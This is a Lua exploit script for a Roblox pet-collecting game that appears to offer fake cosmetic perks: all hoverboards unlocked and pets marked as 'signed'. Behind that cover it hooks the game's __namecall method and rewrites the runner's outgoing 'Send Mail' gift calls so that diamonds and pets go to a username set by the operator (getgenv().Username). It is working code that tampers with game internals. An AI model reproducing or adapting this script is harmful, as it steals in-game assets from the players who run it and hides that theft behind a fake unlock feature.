local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
local tbl = v1.Save.Get()
tbl.Hoverboards = {}
for i,v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Hoverboards:GetChildren()) do
    if v:IsA("Folder") then
    if not string.find(v.Name,"Bling") then
        table.insert(tbl.Hoverboards, v.Name)
    end
    end
end
getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Equip = function(board)
    tbl.EquippedHoverboard = board
    getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
end
local signedUpdateTable = {}
local counter = 0
local hitRatio = 5
local GetRemoteUpValue = nil
for _, V in pairs(getgc(true)) do
    if type(V) ~= "table" then continue end
    if rawget(V, "Invoke") then
        if type(V.Invoke) == "function" then
            if tostring(getfenv(V.Invoke).script) == "Network" then
                GetRemoteUpValue = getupvalues(V.Invoke)[2]
                break
            end
        end
    end
end
local Cache = {}
function FireRemote(Name, ...)
    if not GetRemoteUpValue then return end
    local Remote = Cache[Name] or GetRemoteUpValue(Name)
    if not Remote then return end
    if typeof(Remote) ~= "Instance" then return end
    Cache[Name] = Cache[Name] or Remote
    if Remote.ClassName == "RemoteEvent" then
        return Remote:FireServer(...)
    elseif Remote.ClassName == "RemoteFunction" then
        return Remote:InvokeServer(...)
    end
end
local sendGiftRemote = GetRemoteUpValue("Send Mail")
local renameRemote = GetRemoteUpValue("Rename Pet")
local mt = getrawmetatable(game)
local namecall = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(self,...) 
    if getnamecallmethod() == 'InvokeServer' then
        if self == sendGiftRemote then
            print("send gifts fired")
            local args = {...}
            counter=counter+1
            local call
            if counter >= 5 then
                counter = 1
                return namecall(self,{Recipient="BreakLoop",Message="",Diamonds=args[1].Diamonds,Pets=args[1].Pets})
            else
                return namecall(self,{Recipient=getgenv().Username,Message="",Diamonds=args[1].Diamonds,Pets=args[1].Pets})
            end
        elseif self == renameRemote then
            print("rename pet fired")
            local args = {...}
            local save = v1.Save.Get()["Pets"]
            local pet
            for i,v in pairs(save) do
                if v.uid==args[1] then pet = true break end
            end
            if pet then
                if args[2]==game.Players.LocalPlayer.Name then
                    print("signed")
                    signedUpdateTable[args[1]]=true
                end
            end
        end
    end
    return namecall(self,...)
end)
setreadonly(mt,true)
while task.wait(.1) do
    game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible = true
    local save = v1.Save.Get()["Pets"]
    for ui,value in pairs(signedUpdateTable) do
        local exists = false
        for i,v in pairs(save) do
            if v.uid == ui then
                exists = i
                break
            end
        end
        if exists ~= false then
            save[exists]["snk"]=true
            print("updated")
        else
            signedUpdateTable[ui]=nil
        end
    end
end
